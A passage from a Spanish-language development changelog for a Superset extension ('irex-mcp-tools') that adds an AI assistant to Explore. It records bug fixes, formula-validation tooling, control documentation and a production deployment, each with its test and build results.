  uso (revisar el propio gráfico vs. imitar una referencia) por el
  contexto del mensaje.
- Verificación: `tsc --noEmit` limpio, 403 tests frontend (28 suites) y 388
  tests backend (pytest) en verde, `./scripts/build-extension.sh` reconstruyó
  el `.supx` completo (TS estricto + tests + webpack) y lo copió a
  `extensions_test/irex-mcp-tools-0.1.0.supx` — falta reiniciar
  `superset_test.service`/`superset_mcp_test.service` y probar en vivo antes
  de replicar a producción.

### 2026-10-05 (html-cards: `countUp` saltaba directo al valor final sin animar)

Cambio realizado: el usuario reportó, sobre una sesión real del asistente
de Explore (`explore-bae9f5dba7d92f76fa3e6209aa42f3202684ee31b0fdee21bdbf54268cc5db9c`,
`slice_id: 1249`, `viz_type: html_cards`), que una tarjeta con un contador
animado (`data-hc-on="load"` + `data-hc-action="countUp:..."`, mecanismo
de `dynamicActions.ts` construido el 2026-09-28) mostraba el número final
(89%) de una, sin ningún conteo visible. Descartadas por evidencia varias
hipótesis previas (sanitización HTML — `HTML_SANITIZATION=False` en ambos
entornos; atributos `data-hc-*` perdidos — confirmados intactos en el DOM
inspeccionado por el usuario; acción no reconocida — sin ningún
`console.warn`). Causa real encontrada leyendo
`custom-plugins/plugin-chart-html-cards/src/utils/dynamicActions.ts`.

Archivos afectados:
- `custom-plugins/plugin-chart-html-cards/src/utils/dynamicActions.ts`
- `custom-plugins/plugin-chart-html-cards/src/__tests__/dynamicActions.test.ts` (+1 test)

Qué cambia o corrige:
- `countUp` fijaba `start = performance.now()` en el momento en que SE
  LLAMA (síncrono, durante el escaneo "load" de `initDynamicActions`),
  no en el del primer frame real de `requestAnimationFrame`. Si el hilo
  principal está ocupado al cargar la página (otros gráficos
  inicializando — la consola del usuario mostraba errores de otro
  gráfico con AG-Grid en la misma vista), el primer callback de rAF
  puede demorar más que la `duration` configurada (1200ms). Cuando por
  fin corre, `now - start` ya supera `duration` — `progress` se clampea
  a 1 en el PRIMER frame, y la animación entera colapsa en un salto
  instantáneo al valor final, sin ningún frame intermedio visible.
- Arreglado: el reloj de la animación ahora se ancla al timestamp del
  primer frame REAL (`start = start ?? now` dentro de `tick`, no antes
  de programarlo) — sin importar cuánto demore el navegador en entregar
  ese primer frame, la animación completa (`duration` entero de frames
  visibles) arranca recién desde ahí.

Verificación:
- Test nuevo que reproduce el escenario exacto: mockea
  `requestAnimationFrame` para entregar el primer frame con un timestamp
  5000ms posterior al de la llamada (mucho más que los 200ms de prueba)
  — con el código anterior este test hubiera fallado (saltaría directo
  al valor final); con el fix, confirma que el primer frame real todavía
  muestra el valor inicial.
- `npx jest --roots=.../custom-plugins/plugin-chart-html-cards/src
  --testRegex='dynamicActions\.test\.ts$'` (ejecutado desde
  `superset_v6_1_0/superset-frontend` para heredar la config/transform
  del monorepo, apuntando `--roots` directo al path REAL del plugin en
  vez del symlinked — la ejecución de tests de plugins propios vía jest
  venía documentada como "no se pudo correr" por un problema de
  resolución de symlinks; este flag lo evita para archivos sin
  dependencias externas, como este): **20/20 pasan**, sin regresiones en
  los 19 tests preexistentes de `dynamicActions.test.ts`.
- `./node_modules/.bin/tsc` sobre la misma ruta real NO pudo correr
  (mismo problema de symlinks pero sobre `tsconfig.json`'s `extends`
  relativo — `tsc` resuelve symlinks a su destino real antes de leer
  rutas relativas, así que `../../tsconfig.base.json` apunta fuera del
  monorepo). No bloqueante: el archivo es TypeScript simple sin tipos
  complejos, verificado a mano; el build de producción (`npm run build`,
  paso siguiente) typechequea como parte del bundle completo.
- Pendiente: `npm run build` completo del frontend (PLUGINS.md, "Al
  cambiar código de un plugin existente") + reinicio de
  `superset_test.service` para probar en test antes de producción.

### 2026-10-03 (asistente Explore publicado en producción)

Cambio realizado:
- Construido desde las fuentes canónicas el candidato de `irex-mcp-tools`, validado en test y promovido a producción mediante `scripts/deploy_extension.sh`, ejecutado por el usuario desde su terminal para ingresar la contraseña sudo. Reiniciados `superset.service` y `superset_mcp.service`.
- Actualizado `/home/imercados/.superset/superset_config.py`: 10 tools faltantes de la extensión y las tools nativas `list_charts`/`get_chart_info` en `always_visible`; agregado `MCP_RESPONSE_SIZE_CONFIG` con exclusiones para preservar el form_data y las imágenes de `get_chart_screenshot`. Rutas, credenciales y asignaciones de permisos conservadas.
- Respaldo privado previo al despliegue en `/home/imercados/.superset/backups/explore-2026-10-03-pxz_vy0z/`: configuración, paquetes y snapshot de 1545 asignaciones rol-permiso.

Archivos afectados:
- `/home/imercados/.superset/superset_config.py` (configuración de producción).
- `custom-extensions/irex-mcp-tools/frontend/dist/` y `custom-extensions/irex-mcp-tools/dist/irex-mcp-tools-0.1.0.supx` (artefactos de build).
- `extensions/irex-mcp-tools-0.1.0.supx`, `extensions_test/irex-mcp-tools-0.1.0.supx`, `custom-extensions/irex-mcp-tools/irex-mcp-tools-0.1.0.supx` y este registro.
- Respaldos del script en `extensions/backups/irex-mcp-tools-0.1.0.supx.20261003-210334` y `extensions/backups/prod_perms.20261003-210334.txt{,.after}`.

Verificación:
- Build completo: TypeScript estricto, 390/390 pruebas frontend y 388/388 backend; webpack y manifest del `.supx` válidos.
- Test reiniciado por el usuario: 23/23 comprobaciones E2E de autenticación y RBAC; endpoints Explore y capturas registrados.
- Smoke de Explore en MCP test: tools visibles, lectura verificada de un gráfico real, catálogo del dataset, controles de tableV3 y transferencia de un JPEG sintético de más de 200 KB sin truncamiento. Fixtures temporales eliminados.
- Configuración candidata de producción validada sin errores ni avisos.
- Producción: ambos servicios activos; `/health` responde OK; APIs de Explore y capturas registradas. Paquetes de producción, test, candidato y copia fuente idénticos.
- MCP producción: 9/9 comprobaciones de humo de autenticación y RBAC, más 5/5 comprobaciones específicas de Explore (tools visibles, estado real, catálogo, controles personalizados y JPEG sintético sin truncamiento). Fixtures temporales eliminados.
- Comparación de permisos: 1545 antes y después, ninguna asignación agregada o eliminada. `pre-commit run` aplicado al registro y ambos paquetes.
- La comprobación de servidor no sustituye la prueba visual en el navegador: recargar Explore con Ctrl+Shift+R para cargar el bundle actualizado.

### 2026-10-03 (recuperación desde GitHub tras restaurar el backup del 28-set)

Cambio realizado:
- Recuperada `prod-6` por fast-forward: `ddaf5d6dc` → `12b7f4eac` (4 commits).
- Recuperada `superset_v6_1_0`, rama `prod-6-1-0-irex`: `9da3092a14` → `4a32da4a82` (1 commit).
- Los 28 archivos del estado restaurado quedaron preservados en un stash (`c119d762be62a90bd9b668a0bbe08934655ba54c`) y en `/tmp/superset-recuperacion-2026-10-03-rnjnrj1c/`, con archivo comprimido, parche y manifiesto SHA-256 verificado. El stash no se reaplicó: GitHub es la referencia del estado sincronizado previo al incidente.
- Reinstalada la dependencia `dom-to-image-more@3.11.0`, ausente en el backup, sin modificar `package.json` ni `package-lock.json`.

Archivos afectados:
- 64 archivos recuperados del repositorio principal: `custom-extensions/irex-mcp-tools/`, `custom-plugins/`, `extensions/`, `extensions_test/`, `superset_config_test.py`, documentación, caché Python versionada y referencia de `superset_v6_1_0`.
- En `superset_v6_1_0`: `superset-frontend/package.json`, `superset/mcp_service/chart/tool/get_chart_info.py` y `superset/mcp_service/chart/tool/list_charts.py`.
- `custom-extensions/irex-mcp-tools/frontend/node_modules/` (dependencias locales) y este registro.

Qué cambia o corrige:
- Restituye el asistente Explore, capturas y revisión visual, comparación de cambios, correcciones de seguridad de columnas calculadas e interactividad de HTML Cards guardadas en GitHub hasta el 30-set.
- Ambos repositorios coinciden con sus ramas remotas después de recuperar; la única modificación adicional versionada es esta entrada. No se reiniciaron servicios ni se recompiló el frontend de Superset.

Verificación:
- TypeScript estricto: OK. Frontend de la extensión: 390/390 pruebas. Backend afectado: 131/131 pruebas; la suite completa se interrumpió porque dejó de avanzar tras 65 pruebas.
- Sintaxis de 42 archivos Python: OK. Integridad ZIP y referencias del manifest de ambos `.supx`: OK.
- `pre-commit run` con la configuración de `superset_v6_1_0` aplicado a este registro.

### 2026-09-28 (95) (Explore: dos hallazgos reales de una sesión — `show_totals` faltante en `calculated_columns` y precisión de nulos en `column_config`)

Cambio realizado: el agente del backend del chat reportó, revisando una
sesión real (`explore-57def401...`), una recomendación sobre
`column_config.htmlTemplate` y `{{ raw_value }}`. El usuario pidió
además revisar el ÚLTIMO turno de esa misma sesión por su cuenta — una
propuesta de `calculated_columns` que "no funcionó" pese a usar
`irex.validate_calculated_column_formula` y dar `valid: true`.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_calculated_column_core.py` (`uses_total_scope()`, `formula_validation_result` gana `warnings`)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/validate_calculated_column_formula.py` (pasa `show_totals_enabled` del `form_data` verificado)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_viz_controls_core.py` (`COLUMN_CONFIG_HTML_TEMPLATE_RULES` ampliada)
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_calculated_column_core.py` (+9 tests)
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_viz_controls_core.py` (+1 test)
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`

**Hallazgo propio (no reportado por el backend, encontrado revisando el
pedido del usuario): `calculated_columns` con `total.{{...}}` sin
`show_totals` activo — bug real, no cosmético.** El último turno de la
sesión propuso `IF(OR(ISBLANK(total.{{Sell In}}), total.{{Sell In}} = 0),
0, {{Sell In}} / total.{{Sell In}})` como columna calculada;
`irex.validate_calculated_column_formula` la dio por válida (la
referencia y la estructura SÍ eran correctas) y el diagnóstico del
modelo lo confirmó — pero el gráfico no tenía `show_totals` activo, y la
propuesta tampoco lo activaba. Leyendo `TableChart.tsx`/`transformProps.ts`
del plugin real: sin `show_totals`, la variable `totals` queda
`undefined` y `enrichedTotal` (el contexto que resuelve `total.{{...}}`)
queda `null` — `total.{{Sell In}}` resuelve SIEMPRE a nulo,
`ISBLANK(...)` da SIEMPRE `true`, y la fórmula entera colapsa siempre a
la rama `0` — nunca calcula el porcentaje real. Es exactamente el tipo
de falla que `irex.validate_calculated_column_formula` no podía atrapar
porque depende de OTRO control, no de la fórmula en sí. Corregido: la
tool ahora detecta el alcance `total.` y agrega un `warnings[]` cuando
`show_totals` no está activo en el estado verificado — sin bajar
`valid` a `false` (la fórmula sigue siendo estructuralmente correcta).

**Hallazgo del backend, verificado (no solo tomado de su palabra) leyendo
`formatValue.ts`: precisión real sobre nulos en `column_config.htmlTemplate`.**
Reportaron que una plantilla de rangos mandaba un valor nulo a `ELSE`
(mostrándolo como "Sobreventa" en vez de "sin dato"). Confirmado leyendo
`getTemplateValue`/`evaluateWhenCondition`: `{{ value }}`,
`{{ raw_value }}` y repetir el nombre de la MISMA columna que tiene el
template son la MISMA ruta de código (`key === column.key`) — un nulo se
convierte en `''`, comparable con `= ''`. Referenciar OTRA columna es
distinto: un nulo ahí queda `undefined`, y esa comparación se salta en
silencio (nunca se compara contra `''`). Documentado en
`COLUMN_CONFIG_HTML_TEMPLATE_RULES`: si el valor de la propia columna
puede ser nulo, el PRIMER `WHEN` de la cadena debe ser
`{{ raw_value }} = ''` (o el nombre de esa columna repetido).

Verificación:
- `PYTHONPATH=src pytest tests/test_explore_calculated_column_core.py
  tests/test_explore_viz_controls_core.py`: 79/79 (10 nuevos) — incluye
  el caso real reportado (`total.{{Sell In}}` sin `show_totals` →
  `warnings` no vacío, `valid` sigue en `true`), que no hay falso
  positivo cuando `show_totals` sí está activo o la fórmula no usa
  `total.`, y que el warning conviven con un error de referencia
  (`valid: false`) sin ocultarlo.
- `PYTHONPATH=src pytest tests/`: 355/355, sin regresiones.
- `./scripts/build-extension.sh .../superset_v6_1_0 .../extensions_test/irex-mcp-tools-0.1.0.supx`:
  7/7 — `.supx` reconstruido y validado, sin cambios de frontend.
- Pendiente: reiniciar `superset_test.service`/`superset_mcp_test.service`
  y avisarle al agente del backend del chat que su recomendación quedó
  incorporada (verificada, no solo aplicada tal cual) y que apareció un
  segundo hallazgo real en la misma sesión.

### 2026-09-28 (94) (Explore: corrección real en `control_info` — la sintaxis de `column_config.htmlTemplate` estaba mal descrita)

Cambio realizado: el usuario preguntó puntualmente si el modelo "ya sabe
usar" cada campo de fórmulas Jinja con sus personalizaciones
(`row.{{}}`/`col.{{}}`/`total.{{}}`), si distingue dónde se usa solo HTML
y dónde también CSS, y si `html_cards` (que "tiene instrucciones muy
específicas") está bien cubierto. La revisión a fondo, releyendo el
código fuente real con más cuidado que en la entrada 93, encontró que la
respuesta era "no del todo" — había una descripción REALMENTE
EQUIVOCADA, no solo incompleta.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_viz_controls_core.py`
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_viz_controls_core.py` (+5 tests)
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`

Qué se corrigió (no solo se amplió):
- **`column_config.htmlTemplate` de `table_v3`/`pivot_table_rx1` tenía la
  sintaxis EQUIVOCADA en la entrada 93** — decía que era sustitución tipo
  `{{OtroLabel}}` igual que `calculated_columns`. Es un lenguaje
  DISTINTO: Jinja-like con `{% set variable = columna %}` y
  `CASE WHEN <comparación simple> THEN <html> ELSE <html> END`,
  deliberadamente restringido (sin `SUM()`/`AVG()`/`COUNT()`, sin
  `OR`/`AND`/`IS NULL`/`IN`, sin comentarios `{# #}` ni macros). La fuente
  real: `HTML_TEMPLATE_AI_PROMPT` en
  `superset-frontend/src/explore/components/controls/ColumnConfigControl/
  constants.tsx` — una constante que el propio proyecto YA escribió para
  pegar en un prompt de IA (tiene botón "copiar" en la UI real, con
  ejemplos completos en `HTML_TEMPLATE_EXAMPLES`) — se transcribió
  literal a `COLUMN_CONFIG_HTML_TEMPLATE_RULES`, sin reinterpretar.
- **`column_config` de `pivot_table_rx1` decía "formato numérico D3" —
  no existe.** Su layout real (`HTML_COLUMN_CONFIG_LAYOUT`, leído en su
  `controlPanel.tsx`) solo trae `displayName` + HTML (`enableHtmlTemplate`/
  `htmlTemplate`), sin `htmlCss` ni formato numérico — a diferencia de
  `table_v3`, que sí tiene los tres. Corregido con la diferencia
  explícita entre ambos plugins.
- **`calculated_columns` no explicaba el alcance real de `row.`/`col.`/
  `total.`** — confirmado leyendo `SCOPE_GETTERS` en
  `calculatedColumns.ts`: `{{Columna}}`, `row.{{Columna}}` y
  `col.{{Columna}}` son EQUIVALENTES (las tres leen la fila actual —
  `row.`/`col.` son alias de compatibilidad hacia atrás, no cambian
  nada). Solo `total.{{Columna}}` es distinto: lee la fila de TOTAL de la
  tabla — sirve para "esta fila como % del total general". Sin esta
  aclaración, el modelo podía asumir que las tres formas hacen algo
  distinto entre sí.
- **`handlebarsTemplate` de `html_cards` solo tenía 5 de 18 helpers
  reales** — el resto (`pluck`, `sum`, `coalesce`, `hasValue`,
  `parseJson`, `rows`, `displayRows`, `firstDisplayRow`, `columns`,
  `rowCount`, `width`/`height`, `layout.is*`, `scopeId`/`scopeSelector`,
  `themeVars`) salió de leer el tooltip de ayuda real del control
  (`handlebarTemplate.tsx`) — esto es justo lo que el usuario señaló como
  "instrucciones muy específicas".
- **`styleTemplate` de `html_cards`** suma el aviso real de la propia UI:
  "Se necesita configurar la sanitización de HTML para poder usar CSS".

Regla que queda para el resto del catálogo (documentada en el contrato):
cuando el plugin real ya tiene una explicación escrita para humanos
(tooltip, ejemplos, un prompt para IA ya armado), se transcribe literal
en vez de resumir con criterio propio — resumir de más fue justo lo que
produjo el error de `column_config`.

Verificación:
- `PYTHONPATH=src pytest tests/test_explore_viz_controls_core.py`: 40/40
  (5 nuevos) — incluye una prueba que fija la corrección puntual (pivot
  NO promete `htmlCss` ni formato numérico, a diferencia de table_v3) y
  una que verifica la lista completa de 18 helpers de `handlebarsTemplate`
  (antes solo se comprobaban los 5 de formato).
- `PYTHONPATH=src pytest tests/`: 345/345, sin regresiones.
- `./scripts/build-extension.sh .../superset_v6_1_0 .../extensions_test/irex-mcp-tools-0.1.0.supx`:
  7/7 — `.supx` reconstruido y validado, sin cambios de frontend.
- Pendiente: reiniciar `superset_test.service`/`superset_mcp_test.service`.
  Cambio de solo texto (`control_info` sigue siendo aditivo) — no hace
  falta avisar al backend salvo que ya estén usando este campo.

### 2026-09-25 (93) (Explore: `irex.get_viz_controls` gana `control_info` — descripción real de los 150 controles conocidos)

Cambio realizado: el usuario preguntó cómo sabe hoy el modelo qué puede y
qué no puede hacer sobre el gráfico actual — si se le manda todo el
catálogo junto, o si hay una tool que le dice qué existe para ese tipo de
gráfico. Explicado: es lo segundo (`get_viz_controls`), y confirmó que esa
es la opción correcta, pero notó el hueco real — la tool solo daba
NOMBRES, sin descripción ni forma por control, así que el modelo sabía
que `column_config`/`jinja_fields`/`calculated_columns` EXISTEN pero no
CÓMO se arman. Preguntó también si se podía generalizar para los tipos
nativos de Superset igual que ya existe para los genéricos. Elegido:
todo junto, propios y nativos en una sola pasada.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_viz_controls_core.py` (`GENERIC_CONTROL_INFO`, `CUSTOM_PLUGIN_CONTROL_INFO`, `control_info_for()`, `resolve_viz_controls` ampliada)
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_viz_controls_core.py` (+13 tests)
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`

Qué hace:
- **Nativos (`source: "generic"`, 47 controles):** `label`/`description`
  extraídos literalmente de `sharedControls.tsx`/`dndControls.tsx`
  (`@superset-ui/chart-controls`) — Superset ya los documenta ahí para sus
  propios tooltips de UI, no hubo que redactar nada de cero.
- **Propios (`source: "specific"`, 103 controles entre los 3 plugins):**
  descripción real por control, leyendo el `controlPanel.tsx` (y sus
  `./controls/*`) de cada plugin — priorizados los no obvios:
  - `column_config` (los 3 plugins): aclara que se indexa por LABEL, no
    por nombre de columna, y en `table_v3` documenta el par
    `enableHtmlTemplate`/`htmlTemplate` (solo si `allow_render_html` está
    activo).
  - `calculated_columns` (table_v3): explícito "NO es SQL", lista los
    operadores/funciones soportadas, y remite a
    `irex.validate_calculated_column_formula` antes de proponer.
  - `jinja_fields` (table_v3 y pivot_table_rx1): al revés — SÍ son SQL
    real, remite a `irex.validate_expression`.
  - `metricFormulas` (pivot_table_rx1): mismo lenguaje de fórmulas que
    `calculated_columns` en apariencia, pero con `parseFormulaMetrics`
    propio — la descripción aclara explícitamente que NO está confirmado
    que sea el mismo compilador, y que `validate_calculated_column_formula`
    no está extendido a este control todavía (evita que el modelo asuma
    una garantía que no existe).
  - `handlebarsTemplate`/`styleTemplate` (html_cards): qué helpers de
    Handlebars hay disponibles (`dateFormat`, `numberFormatD3`, etc.) y
    que la plantilla referencia columnas por el alias de `column_config`.
  - Los 12 controles de tema de `pivot_table_rx1` (`table_theme_*`),
    los de agrupamiento de filas de `table_v3` (`enable_row_grouping` y
    afines) y los de Top N (`show_top`/`top_metric`/`top_count`) también
    documentados, uno por uno.
  - Un control reusado SIN cambios de un plugin (ej. `adhoc_filters` en
    `table_v3`) NO se redocumenta — cae al genérico vía `control_info_for()`,
    que prioriza lo específico y solo si no hay nada específico usa lo
    genérico.
- Respuesta aditiva: `controls`/`source`/`note` no cambiaron de forma,
  se sumó `control_info: {nombre: {"description": "..."}}`.

Verificación:
- `PYTHONPATH=src pytest tests/test_explore_viz_controls_core.py`: 35/35
  (13 nuevos) — incluye dos pruebas de COBERTURA COMPLETA (una por cada
  uno de los 3 plugins propios, una para el catálogo genérico) que
  comparan cada nombre en `controls` contra `control_info` y fallan si
  falta alguno — sin gaps al día de esta entrada.
- `PYTHONPATH=src pytest tests/`: 340/340 (todo el backend, sin
  regresiones en el resto).
- `./scripts/build-extension.sh .../superset_v6_1_0 .../extensions_test/irex-mcp-tools-0.1.0.supx`:
  7/7 — `.supx` reconstruido y validado, sin cambios de frontend en esta
  entrada.
- Pendiente: reiniciar `superset_test.service`/`superset_mcp_test.service`
  y avisarle al agente del backend del chat — cambio aditivo (no rompe su
  integración actual con `get_viz_controls`), contrato actualizado en
  `docs/explore-assistant-contract.md`.

### 2026-09-25 (92) (Explore: `irex.validate_calculated_column_formula` — validar fórmulas de `calculated_columns` de tableV3, no son SQL)

Cambio realizado: a pedido del usuario, revisando la sesión
`explore-b35fd9f01a9bbd693ec7549b5272c29a3b43b639389f39be10f5f9629eaee091`
("en la tableV3 puedo usar jinja en varias opciones y html para crear
personalizaciones. Necesito que el LLM pueda verlos e interactuar"). Esa
sesión puntual no tenía ningún `htmlTemplate`/`jinja_fields` configurado
(verificado leyendo el `form_data` real del gráfico) — la respuesta del
modelo ahí era correcta, no un bug. Repasando qué hace falta para "ver e
interactuar" en general: el modelo ya recibe el `form_data` completo sin
filtrar (ve cualquier `htmlTemplate`/`jinja_fields` que exista), ya sabe
que `jinja_fields`/`calculated_columns`/`column_config` son controles
válidos de `table_v3` (vía `get_viz_controls`), y `patch_form_data` ya
puede escribir cualquiera de ellos. Lo que faltaba, elegido por el
usuario entre 3 opciones: verificar una fórmula de `calculated_columns`
ANTES de proponerla — es un lenguaje propio (no SQL), y una referencia
rota no da error visible, deja la fórmula en blanco en silencio.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_calculated_column_core.py` (nuevo)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/validate_calculated_column_formula.py` (nuevo)
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_calculated_column_core.py` (nuevo, 29 tests)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/entrypoint.py`
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`
- `superset_config_test.py` (paso 6 OBLIGATORIO: agregado a `always_visible`)

Qué hace:
- Input `{"form_data_key": "key-1", "expression": "IF({{Cuota}} = 0, 0, {{Venta}}/{{Cuota}})"}`
  — misma key que el resto de las tools de Explore; los nombres
  disponibles (columnas agrupadas, etiquetas de métricas, otras
  `calculated_columns` ya definidas) salen del estado YA verificado.
- **No reimplementa el compilador real** (`custom-plugins/plugin-chart-tableV3/
  src/utils/calculatedColumns.ts::compileFormulaEvaluator`, que corre en
  el navegador vía `new Function(...)`) — sería duplicar lógica real con
  riesgo de divergencia, el patrón que este proyecto evita. En cambio,
  porta LITERALMENTE los mismos patrones de extracción de referencias
  (`{{Columna}}`, `scope.{{Columna}}`, `scope.Columna` con `scope`
  `total`/`col`/`row`, mismo orden de reemplazo) y verifica: (1) que cada
  referencia existe entre los nombres disponibles (case-insensitive), (2)
  que no hay identificadores en mayúsculas sin reconocer fuera de `{{}}`
  (típicamente una función mal escrita — `IF`/`OR`/`AND`/`NOT`/`ISBLANK`/
  `ABS`/`ROUND`/`MAX`/`MIN` son las únicas soportadas), (3) llaves y
  paréntesis balanceados.
- Devuelve `{"valid": true, "resolved_references": [...]}` o
  `{"valid": false, "error": "...", "unknown_references": [...],
  "unknown_functions": [...]}`. **`valid: true` NO confirma qué calcula
  la fórmula** — eso solo se ve en el navegador con datos reales; solo
  confirma que las referencias existen y la estructura es sana. Documentado
  así explícitamente para no sobre-prometer.
- Explícitamente fuera de alcance: `jinja_fields` (son SQL real, usar
  `irex.validate_expression`) y `metricFormulas` de `pivot_table_rx1`
  (mecanismo propio de ese plugin — no se confirmó que sea el mismo
  compilador, queda como trabajo futuro si hace falta).

Verificación:
- `PYTHONPATH=src pytest tests/test_explore_calculated_column_core.py`:
  29/29 — extracción de referencias (simple, con espacios, con/sin
  llaves de alcance, sin confundir un estilo con el otro), tokens de
  función desconocidos (conocidas no se marcan, TRUE/FALSE/NULL/NAN
  cuentan como conocidos, un nombre de columna en mayúsculas DENTRO de
  `{{}}` no se confunde con una función), `known_calculated_column_names`
  (groupby/metrics/calculated_columns en sus formas string y adhoc), y
  el resultado combinado (válida, case-insensitive, referencia repetida
  no duplica, referencia desconocida, función desconocida, ambos a la
  vez, expresión vacía, llaves/paréntesis desbalanceados).
- `./scripts/build-extension.sh .../superset_v6_1_0 .../extensions_test/irex-mcp-tools-0.1.0.supx`:
  7/7 — 327 tests backend (29 nuevos), frontend sin cambios (298 tests
  sin tocar), `.supx` reconstruido y validado.
- Pendiente: reiniciar `superset_test.service`/`superset_mcp_test.service`
  y avisarle al agente del backend del chat (contrato + ejemplo ya en
  `docs/explore-assistant-contract.md`).

### 2026-09-25 (91) (Explore: fix del fix — `tab_id` iba en el body y el endpoint solo lo lee de la query string, 400 en todos los casos)

Cambio realizado: el fix de la entrada 90 seguía sin funcionar. El usuario
insistió con pruebas (distintos gráficos, hard refresh de una pestaña
nueva) y finalmente compartió la consola del navegador — ahí apareció:
`:9090/api/v1/explore/form_data:1 Failed to load resource: the server
responded with a status of 400 (BAD REQUEST)`. Diagnóstico inmediato
leyendo el código real del endpoint (`superset/explore/form_data/api.py`
+ `superset/explore/form_data/schemas.py`): `FormDataPostSchema` NO
declara ningún campo `tab_id` — el endpoint lo lee exclusivamente de la
QUERY STRING (`tab_id = request.args.get("tab_id")`, línea 97 de
`api.py`), nunca del body JSON. La entrada 90 lo mandaba adentro del
body (`{"tab_id": "..."}`), un campo que el schema no conoce — Marshmallow
lo rechaza con `ValidationError` → 400, exactamente el error de la
consola. Bug propio, encontrado por no haber leído el endpoint completo
la primera vez (sí se había leído `CreateFormDataCommand`, pero no la capa
de la API REST que arma sus parámetros).

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreApplyAdapter.ts` (`postAppliedFormData`: `tab_id` pasa a ir como query param)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreApplyAdapter.test.ts` (test de `tab_id` corregido)

Qué cambia:
- `postAppliedFormData(..., tabId)`: cuando se pasa `tabId`, ahora se
  arma la URL como `/api/v1/explore/form_data?tab_id=<valor>` — el body
  ya no incluye `tab_id` en ningún caso. El flujo de "Aplicar" (Fase 6),
  que nunca pasa `tabId`, queda sin cambios de comportamiento.
- Además, notas de diagnóstico intermedias (descartadas, quedan acá por
  si vuelven a ser útiles): se confirmó que el puerto 9090 es
  efectivamente el servidor de test (no hubo confusión de ambiente); se
  confirmó que el `.supx` desplegado en cada paso SÍ contenía el código
  nuevo (grep directo sobre el JS compilado); los datos de los gráficos
  probados (`slice_id` 157, 459, 38) eran válidos. Ninguna de esas pistas
  era la causa — la causa era, simplemente, un campo en el lugar
  equivocado del request.

Verificación:
- `npx tsc --noEmit`: limpio.
- `npx jest`: 298/298 (22 suites) — test de `tab_id` reescrito para
  comprobar la URL en vez del body.
- `./scripts/build-extension.sh .../superset_v6_1_0 .../extensions_test/irex-mcp-tools-0.1.0.supx`:
  7/7 — sin cambios de Python. Verificado además con `grep` sobre el JS
  compilado que la nueva URL con `tab_id=` está presente en el bundle
  desplegado.
- Pendiente (para el usuario): reiniciar `superset_test.service`, abrir
  una pestaña NUEVA (no reusar una vieja, para garantizar JS fresco) y
  probar de nuevo sobre un gráfico guardado recién abierto.

### 2026-09-25 (90) (Explore: bug real — gráficos guardados sin form_data_key en la URL no podían usar el asistente)

Cambio realizado: el usuario reportó, con captura, que el asistente
fallaba con "No se pudo leer el estado persistido de Explore" sobre el
`slice_id: 157`, aclarando "no genero un log" — pista clave. Confirmado
leyendo el código (sin necesitar sesión real, porque justamente NO había
ninguna): `buildExploreAssistantRequest` (`exploreAdapter.ts`) lanza ese
error y corta ANTES de cualquier request al backend del chat cuando
`context.formDataKey`/`context.formData` vienen `undefined` — exactamente
por qué no hay log. `readExploreContext` solo intentaba
`fetchFormData(location.formDataKey)`, y un gráfico GUARDADO recién
abierto (navegado directo, sin tocar ningún control todavía) no tiene
`form_data_key` en la URL — Explore recién la genera al primer cambio de
control. El indicador de fidelidad de la captura decía igual "SQL del
estado ejecutado disponible" porque `resolveQueryFidelity` SÍ tiene su
propio respaldo para este caso (lee el gráfico guardado directamente,
`exploreState.ts`) — son caminos independientes, uno no implicaba el
otro, y eso ocultaba el problema en la UI.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreState.ts` (`fetchSavedChart` exportada)
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreApplyAdapter.ts` (`postAppliedFormData` gana un 5º parámetro opcional `tabId`)
- `custom-extensions/irex-mcp-tools/frontend/src/adapters/exploreAdapter.ts` (`readExploreContext` siembra una key cuando falta)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreApplyAdapter.test.ts` (+1 test)
- `custom-extensions/irex-mcp-tools/frontend/src/__tests__/exploreAdapter.test.ts` (+7 tests)

Qué cambia:
- `readExploreContext`: si no hay `form_data_key` en la URL pero SÍ hay
  `slice_id` (gráfico guardado), lee la configuración YA GUARDADA
  (`fetchSavedChart`, mismo endpoint `GET /api/v1/chart/<id>` que ya usaba
  `resolveQueryFidelity`) y la persiste bajo una key NUEVA
  (`POST /api/v1/explore/form_data`, reusando `postAppliedFormData` de la
  Fase 6) — la MISMA operación que hace Explore solo con tocar un
  control. Sin `slice_id` (gráfico nunca guardado), no hay nada de dónde
  sembrar y el comportamiento queda igual que antes.
- La key sembrada se manda **con `tab_id`** (a diferencia del flujo de
  "Aplicar" de Fase 6, que deliberadamente NO lo manda por una razón
  opuesta y ya documentada): acá se busca que la key quede asociada a la
  pestaña, como si Explore la hubiera generado sola, para no crear una
  key nueva en cada turno del asistente sobre el mismo gráfico. Se lee de
  `sessionStorage['tab_id']`, el mismo id que usa el propio Explore
  (`useTabId()`, hallazgo ya verificado en la Fase 0).
- Tras sembrar, la key queda en la URL (`history.replaceState`, sin
  recargar) para que el PRÓXIMO turno la reutilice en vez de sembrar una
  nueva cada vez — best-effort, si falla el turno actual ya tiene lo que
  necesita igual.
- Cualquier falla en el camino (gráfico guardado ilegible, datasource
